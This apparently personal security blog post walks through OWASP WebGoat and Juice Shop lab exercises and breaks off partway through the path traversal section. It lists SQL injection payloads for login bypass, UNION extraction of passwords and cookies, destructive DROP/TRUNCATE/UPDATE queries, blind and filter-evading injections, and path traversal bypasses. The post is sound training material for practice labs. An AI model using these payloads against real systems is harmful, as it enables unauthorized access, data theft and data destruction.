
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://garysuyemoto.com/blog/2023/05/26/web-and-goats-p1/">
      
      
      
        <link rel="next" href="../../31/ssh-attacks/">
      
      
        
      
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14+insiders-4.35.1">
    
    
      
        <title>web and goats part 1 - CyberInsecurities</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.14411569.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.df142b89.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="yellow">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#web-goats-part-1" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="CyberInsecurities" class="md-header__button md-logo" aria-label="CyberInsecurities" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.045 18.894 9.94 12 3.045 5.106a.75.75 0 0 1 1.06-1.061l7.425 7.425a.75.75 0 0 1 0 1.06l-7.424 7.425a.75.75 0 0 1-1.061-1.06Zm8.205.606a.75.75 0 0 0 0 1.5h9.5a.75.75 0 0 0 0-1.5h-9.5Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CyberInsecurities
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              web and goats part 1
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="CyberInsecurities" class="md-nav__button md-logo" aria-label="CyberInsecurities" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.045 18.894 9.94 12 3.045 5.106a.75.75 0 0 1 1.06-1.061l7.425 7.425a.75.75 0 0 1 0 1.06l-7.424 7.425a.75.75 0 0 1-1.061-1.06Zm8.205.606a.75.75 0 0 0 0 1.5h9.5a.75.75 0 0 0 0-1.5h-9.5Z"/></svg>

    </a>
    CyberInsecurities
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      <a href="../../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    Blog
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    
  
    Archive
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Archive
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../archive/2023/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    2023
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    
  
    Categories
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Categories
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../category/blue-team/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    Blue Team
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../category/broken-access-control/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    Broken Access Control
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../category/sql-injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    SQL Injection
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../category/web-app-pen-testing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    
  
    Web App Pen Testing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Injection
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#owasp-webgoat" class="md-nav__link">
    <span class="md-ellipsis">
      
        OWASP WebGoat
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#blind-sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Blind SQL Injection
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solutions-intro" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solutions Intro
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solutions Intro">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-intro-solution-for-exercise-9" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Intro) - Solution for exercise 9:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-intro-solution-for-exercise-10" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Intro) - Solution for exercise 10:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-intro-solution-for-exercise-11" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Intro) - Solution for exercise 11:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-intro-solution-for-exercise-12" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Intro) - Solution for exercise 12:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-intro-solution-for-exercise-13" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Intro) - Solution for exercise 13:
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solutions-advanced-where-things-get-interesting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solutions Advanced -- Where things get interesting
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solutions Advanced -- Where things get interesting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-advanced-solution-for-exercise-3" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Advanced) - Solution for exercise 3:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-advanced-solution-for-exercise-5" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat SQL (Advanced) - Solution for exercise 5:
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solutions-mitigation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solutions Mitigation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solutions Mitigation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-mitigation-solution-for-exercise-9" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat  SQL (Mitigation) - Solution for exercise 9:
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solutions-path-traversal" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solutions Path Traversal
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solutions Path Traversal">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-path-traversal-solution-for-exercise-3" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat  SQL (Path Traversal) - Solution for exercise 3:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-path-traversal-solution-for-exercise-4" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat  SQL (Path Traversal) - Solution for exercise 4:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-path-traversal-solution-for-exercise-5" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat  SQL (Path Traversal) - Solution for exercise 5:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webgoat-sql-path-traversal-solution-for-exercise-7" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebGoat  SQL (Path Traversal) - Solution for exercise 7:
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-sql-injection-queries-i-used-to-get-necessary-info-from-the-db" class="md-nav__link">
    <span class="md-ellipsis">
      
        Interesting SQL Injection queries I used to get necessary info from the DB:
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
  <div class="md-content md-content--post" data-md-component="content">
    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
      <div class="md-sidebar__scrollwrap">
        <div class="md-sidebar__inner md-post">
          <nav class="md-nav">
            <div class="md-post__back">
              <div class="md-nav__title md-nav__container">
                <a href="../../../.." class="md-nav__link">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
                  <span class="md-ellipsis">
                    Back to index
                  </span>
                </a>
              </div>
            </div>
            
            <ul class="md-post__meta md-nav__list">
              <li class="md-nav__item md-nav__title">
                <div class="md-nav__link">
                  <span class="md-ellipsis">
                    Metadata
                  </span>
                </div>
              </li>
              <li class="md-nav__item">
                <div class="md-nav__link">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5v-5Z"/></svg>
                  <time datetime="2023-05-26 00:00:00" class="md-ellipsis">May 26, 2023</time>
                </div>
              </li>
              
                <li class="md-nav__item">
                  <div class="md-nav__link">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3H9m3 2 4 13 3-1-4-13-3 1M5 5v13h3V5H5M3 19v2h18v-2H3Z"/></svg>
                    <span class="md-ellipsis">
                      in
                      
                        <a href="../../../../category/sql-injection/">SQL Injection</a>, 
                        <a href="../../../../category/web-app-pen-testing/">Web App Pen Testing</a></span>
                  </div>
                </li>
              
              
            </ul>
            
          </nav>
          
        </div>
      </div>
    </div>
    <article class="md-content__inner md-typeset">
      
        
  
  





<div><h1 id="web-goats-part-1">Web Goats Part 1</h1>
<p>If you want to learn or practice your cybersecurity skills, especially against the top ten OWASP web vulnerabilities, then the <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a> is a great tool. Allowing for you to practice a range of different techniques that would be otherwise be time consuming to set up in a lab setting, such as fuzzing and SQL Injection, WebGoat also provides great insight and guidance.</p>
<!-- more -->

<div class="admonition info">
<p class="admonition-title">Get the WebGoat Distro</p>
<p>Go to the <a href="https://github.com/WebGoat/WebGoat/releases" target="_blank">WebGoat Github</a> for the latest distro. Just download it and run it:
</p><div class="language-java highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="p">.</span><span class="na">jar</span>
</span></code></pre></div>
</div>
<p>Default server settings serve the WebGoat on localhost (127.0.0.1) on port 8080. Just open a browser and go to the URL:
</p><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>https://localhost:8080/WebGoat
</span></code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>It's not a good idea to set up WebGoat and provide it access to the WAN/internet and therefore OTHERS to access your WebGoat.</p>
</div>
<p>Some of the lessons require some kind of proxy and the recommendation is for <a href="https://owasp.org/www-project-zap">OWASP ZAP</a> or <a href="https://portswigger.net/burp/communitydownload">BurpSuite</a>. In many case, I found that you could just use the browser's dev tools. I used all of the choices, ZAP, Burp and the dev tools. Burp requires that you get a trial license for scanning. ZAP was incredibly handy for fuzzing, albeit in many cases it was just brute force.</p>
<p>OK. So, I skipped ahead in the lessons and went straight for the SQL Injection section...</p>
<h3 id="sql-injection">SQL Injection</h3>
<p>I find most information on the internet about SQL Injection sorely lacking. It's quite interesting to me that this same example for SQL Injection has been around for a very long time, if I'm not mistaken.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>' or 1=1;--
</span></code></pre></div>
<p>Does this still work on a bunch of servers? I wonder.</p>
<p>Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:</p>
<p>User:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>administrator\' or 1=1;--
</span></code></pre></div>
<p>Pass: test</p>
<p>Which logged me in and provided me with the real admin email: admin@juice-sh.op</p>
<h3 id="owasp-webgoat">OWASP WebGoat</h3>
<p>WebGoat is one of the best free instructional units for various types of web vulnerabilities that I have come across. The entire app is packaged as a single .jar and is super simple to get running. There are 8 lessons broken down by the types of vulnerabilities you would see in the wild and many of the lessons have several sections each. WebGoat is great for learning!</p>
<div class="admonition info">
<p class="admonition-title">Download and installation instructions</p>
<p><a href="https://owasp.org/www-project-webgoat/" target="_blanks">OWASP WebGoat</a> main page<br>
You can find the latest .jar distribution files at the <a href="https://github.com/WebGoat/WebGoat/releases" target="_blank">WebGoat Github</a> page.</p>
</div>
<p>I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can change the server address using the following command line argument:</p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">--</span><span class="n">server</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span>
</span></code></pre></div>
<p>And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.</p>
<p>This is what finally worked for me (which I gleaned from the <a href="https://github.com/WebGoat/WebGoat">github repo</a>):</p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">Dserver</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span>
</span></code></pre></div>
<details class="info">
<summary>FYI WebGoat uses HSQLDB</summary>
<p>Some interesting functions for HSQLDB:
</p><div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>char()
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>length()
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>substr()
</span></code></pre></div>
More can be found in <a href="https://hsqldb.org/doc/2.0/guide/guide.html#sqlgeneral-chapt" target="_blank">the reference</a> and more specifically the <a href="https://hsqldb.org/doc/2.0/guide/guide.html#builtinfunctions-chapt">system functions</a>.
</details>
<p>Some good tips picked up from the lessons in WebGoat:</p>
<ul>
<li>' or 1=1; TRUNCATE audit_log;--</li>
<li>' or '1'='1</li>
<li>SQL Injection is more common in PHP, ASP and ColdFusion</li>
<li>SQL server exploits can lead to a command shell</li>
<li>String concatenation with ' or + or ||</li>
<li>Strings without quotes: char(27)</li>
<li>SELECT * FROM users WHERE name = '+char(27) OR 1=1</li>
<li>use prepared statements help mitigate SQL Injection</li>
<li>implement whitelist with ORDER BY</li>
<li>Use zip files to overwrite files after upload using path traversal</li>
</ul>
<h3 id="blind-sql-injection">Blind SQL Injection</h3>
<ul>
<li>Involves asking 'database true or false questions' when server provides only generic error responses.</li>
<li>Types include: content-based and time-based injections</li>
<li>Find out what type of DB as that can provide insight to available system tables</li>
</ul>
<div class="language-yaml highlight"><span class="filename">Content-based</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">https://shop.example.com/?article=4 and 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
</span></code></pre></div>
<ol>
<li>If no error is thrown, then this DB might be susceptible to SQL Injection</li>
</ol>
<div class="language-javascript highlight"><span class="filename">Time-based</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="w">    </span><span class="err">'</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="mf">1</span><span class="o">=</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">10</span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="c1">// (1)!</span>
</span></code></pre></div>
<ol>
<li>If there is 10 second delay then this DB might be susceptible</li>
</ol>
<hr>
<h2 id="solutions-intro">Solutions Intro</h2>
<hr>
<h3 id="webgoat-sql-intro-solution-for-exercise-9">WebGoat SQL (Intro) - Solution for exercise 9:</h3>
<p>A classic??</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>' or '1'='1
</span></code></pre></div>
<h3 id="webgoat-sql-intro-solution-for-exercise-10">WebGoat SQL (Intro) - Solution for exercise 10:</h3>
<p></p><div class="language-text highlight"><span class="filename">Login_Count:</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>1
</span></code></pre></div>
<div class="language-yaml highlight"><span class="filename">User_id:</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="l l-Scalar l-Scalar-Plain">1 or 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
</span></code></pre></div>
<ol>
<li>These fields expect numbers and therefore no quotes are necessary.</li>
</ol>
<h3 id="webgoat-sql-intro-solution-for-exercise-11">WebGoat SQL (Intro) - Solution for exercise 11:</h3>
<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>' or 1=1;--
</span></code></pre></div>
<p>or</p>
<p></p><div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Blah
</span></code></pre></div>
<div class="language-text highlight"><span class="filename">Authentication TAN:</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>' or '1'='1
</span></code></pre></div>
<h3 id="webgoat-sql-intro-solution-for-exercise-12">WebGoat SQL (Intro) - Solution for exercise 12:</h3>
<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'
</span></code></pre></div>
<h3 id="webgoat-sql-intro-solution-for-exercise-13">WebGoat SQL (Intro) - Solution for exercise 13:</h3>
<div class="language-text highlight"><span class="filename">Action contains:</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>' or 1=1; DROP TABLE access_log;--
</span></code></pre></div>
<hr>
<h2 id="solutions-advanced-where-things-get-interesting">Solutions Advanced -- Where things get interesting</h2>
<hr>
<h3 id="webgoat-sql-advanced-solution-for-exercise-3">WebGoat SQL (Advanced) - Solution for exercise 3:</h3>
<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--
</span></code></pre></div>
<p>or</p>
<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Dave'; select * from user_system_data;--
</span></code></pre></div>
<h3 id="webgoat-sql-advanced-solution-for-exercise-5">WebGoat SQL (Advanced) - Solution for exercise 5:</h3>
<p>This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:</p>
<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>devon' and 1=1;--
</span></code></pre></div>
<p>The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.</p>
<p>Also, you can double check that injection is possible by using the reverse logic:</p>
<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>devon' and 1=2;--
</span></code></pre></div>
<p>Using this entry, one can create the same user over and over without being warned that the user already exists. This again indicates that the server is using the injection. Devon exists so the left side of AND is TRUE and as 1=2 is FALSE, the boolean logic becomes:</p>
<p>true AND false = false</p>
<hr>
<h2 id="solutions-mitigation">Solutions Mitigation</h2>
<hr>
<h3 id="webgoat-sql-mitigation-solution-for-exercise-9">WebGoat  SQL (Mitigation) - Solution for exercise 9:</h3>
<p>Here the backend server is removing all spaces. In order to bypass this, we can use multiline comments to replace the spaces:</p>
<div class="language-text highlight"><span class="filename">Replace spaces with comments</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--
</span></code></pre></div>
<hr>
<h2 id="solutions-path-traversal">Solutions Path Traversal</h2>
<hr>
<h3 id="webgoat-sql-path-traversal-solution-for-exercise-3">WebGoat  SQL (Path Traversal) - Solution for exercise 3:</h3>
<p>Here the app is replacing occurrences of "../" to prevent "dot-dot-slash" or path traversal. In the following example, the middle is replaced by the app leaving the path traversal nonetheless:</p>
<div class="language-text highlight"><span class="filename">Full Name:</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>....//test
</span></code></pre></div>
<h3 id="webgoat-sql-path-traversal-solution-for-exercise-4">WebGoat  SQL (Path Traversal) - Solution for exercise 4:</h3>
<ul>
<li>Open <em>Manual Request Editor</em> using OWASP ZAP.   </li>
<li>In the request body change:
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>filename="../white-bookshelf.jpg"
</span></code></pre></div></li>
</ul>
<h3 id="webgoat-sql-path-traversal-solution-for-exercise-5">WebGoat  SQL (Path Traversal) - Solution for exercise 5:</h3>
